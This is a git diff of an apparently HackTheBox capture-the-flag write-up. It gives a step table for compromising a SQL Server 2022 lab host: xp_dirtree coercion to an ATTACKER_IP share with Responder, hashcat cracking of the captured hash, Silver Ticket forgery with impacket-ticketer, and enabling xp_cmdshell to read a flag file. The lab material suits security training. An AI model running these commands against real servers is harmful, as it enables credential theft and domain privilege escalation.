@@ -9,20 +9,24 @@ Hints: True
 > **Target:** `10.10.11.90`
 > **Service:** Microsoft SQL Server 2022 (1433)
 
-| Step | User / Access                         | Technique Used                                                                                                                            | Result                                                                                                                    |
-| :--- | :------------------------------------ | :---------------------------------------------------------------------------------------------------------------------------------------- | :------------------------------------------------------------------------------------------------------------------------ |
-| 1    | (Local / Recon)                       | `nmap -sVC`                                                                                                                               | Discovered only MSSQL (1433) open on `10.10.11.90` running SQL Server 2022.                                               |
-| 2    | scott (guest SQL)                     | Default/Provided creds → `impacket-mssqlclient scott:'Sm230#C5NatH'`                                                                      | Logged into SQL as low-privilege/guest account.                                                                           |
-| 3    | (attacker)                            | `xp_dirtree` abuse to coerce SMB auth + `Responder`                                                                                       | Triggered server to authenticate to attacker and captured `SIGNED\mssqlsvc` NTLMv2 hash.                                  |
-| 4    | (attacker)                            | `hashcat -m 5600`                                                                                                                         | Cracked `mssqlsvc` password from captured NTLM hash.                                                                      |
-| 5    | mssqlsvc (domain service account)     | `impacket-mssqlclient -windows-auth SIGNED/mssqlsvc:PASS`                                                                                 | Obtained domain/service credentials (still limited on SQL session when used directly).                                    |
-| 6    | (attacker)                            | SQL enumeration (sys.server_principals / server_role_members)                                                                             | Found `SIGNED\IT` group is `sysadmin` on the instance and discovered domain SID + relevant RIDs (e.g., IT = 1105).        |
-| 7    | (attacker)                            | Silver Ticket generation (`impacket-ticketer`) using `mssqlsvc` NTLM hash + domain SID + group RIDs + SPN `MSSQLSvc/DC01.SIGNED.HTB:1433` | Created a forged Kerberos TGS (Silver Ticket) embedding the IT group RID so the service would accept sysadmin membership. |
-| 8    | mssqlsvc / Administrator (via ticket) | Load ticket `export KRB5CCNAME=*.ccache` + `impacket-mssqlclient -k`                                                                      | Authenticated with DBO/sysadmin on SQL (IS_SRVROLEMEMBER returned 1).                                                     |
-| 9    | Administrator / dbo on MSSQL          | `sp_configure` + `RECONFIGURE` to enable `xp_cmdshell`                                                                                    | Enabled `xp_cmdshell` for command execution.                                                                              |
-| 10   | Administrator / dbo on MSSQL          | `EXEC xp_cmdshell 'type C:\Users\mssqlsvc\Desktop\user.txt'`                                                                              | Read `user.txt` (user flag) from `mssqlsvc`'s desktop.                                                                    |
+| Step | User / Access                  | Technique Used                                                                                                                                                                      | Result                                                                                                        |
+| :--: | :----------------------------- | :---------------------------------------------------------------------------------------------------------------------------------------------------------------------------------- | :------------------------------------------------------------------------------------------------------------ |
+|   1  | (Local / Recon)                | `nmap -sVC`                                                                                                                                                                         | Discovered only MSSQL (1433) open on `10.10.11.90` running SQL Server 2022.                                   |
+|   2  | `scott` (guest SQL)            | Provided creds → `impacket-mssqlclient scott:'Sm230#C5NatH'@10.10.11.90`                                                                                                            | Logged into SQL as low-privilege/guest account.                                                               |
+|   3  | (attacker)                     | `EXEC xp_dirtree '\\\\ATTACKER_IP\\share'` + `Responder`                                                                                                                            | Triggered server to authenticate to attacker and captured `SIGNED\mssqlsvc` NTLMv2 hash.                      |
+|   4  | (attacker)                     | `hashcat -m 5600 mssqlsvc.hash /usr/share/wordlists/rockyou.txt`                                                                                                                    | Cracked `mssqlsvc` password from captured NTLM hash.                                                          |
+|   5  | `mssqlsvc` (service account)   | `impacket-mssqlclient -windows-auth SIGNED/mssqlsvc:'<pass>'@10.10.11.90`                                                                                                           | Possessed valid domain/service credentials (SQL still limited when used directly).                            |
+|   6  | (attacker)                     | SQL enumeration (`sys.server_principals`, `sys.server_role_members`)                                                                                                                | Found `SIGNED\IT` has `sysadmin` on instance; discovered domain SID and RIDs (e.g., IT = 1105).               |
+|   7  | (attacker)                     | Silver Ticket generation: `impacket-ticketer -nthash <nthash> -domain SIGNED.HTB -domain-sid <SID> -user-id <RID> -groups 512,519,1105 -spn MSSQLSvc/DC01.SIGNED.HTB:1433 mssqlsvc` | Forged TGS (Silver Ticket) embedding IT group RID so the service would accept sysadmin membership.            |
+|   8  | `mssqlsvc` (via forged ticket) | Load ticket: `export KRB5CCNAME=mssqlsvc.ccache` + `impacket-mssqlclient -k -no-pass DC01.SIGNED.HTB -windows-auth`                                                                 | Authenticated as `SIGNED\mssqlsvc` **with dbo/sysadmin on the SQL instance** (IS_SRVROLEMEMBER returned `1`). |
+|   9  | `mssqlsvc` (SQL dbo/sysadmin)  | `EXEC sp_configure 'show advanced options', 1; RECONFIGURE; EXEC sp_configure 'xp_cmdshell', 1; RECONFIGURE;`                                                                       | Enabled `xp_cmdshell` for command execution inside SQL Server.                                                |
+|  10  | `mssqlsvc` (SQL dbo/sysadmin)  | `EXEC xp_cmdshell 'type C:\Users\mssqlsvc\Desktop\user.txt'`                                                                                                                        | Read `user.txt` (user flag) from `mssqlsvc`'s desktop.                                                        |
 
+**⚠️ Notice:
+This challenge is currently active on HackTheBox.
+In accordance with HackTheBox's content policy, this writeup will be made publicly available only after the challenge is retired.**
 
+<!--
 
 ## Nmap Recon
 
@@ -319,4 +323,4 @@ EXEC xp_cmdshell 'type C:\\Users\\mssqlsvc\\Desktop\\user.txt';
 * The PAC must include the necessary group RIDs (e.g., `SIGNED\IT`) for the service to accept elevated privileges.
 * With a valid Silver Ticket for `MSSQLSvc/DC01:1433` you can authenticate as a high-privilege account (here `mssqlsvc` with sysadmin) and enable `xp_cmdshell` to access local files.
 
-
+-->
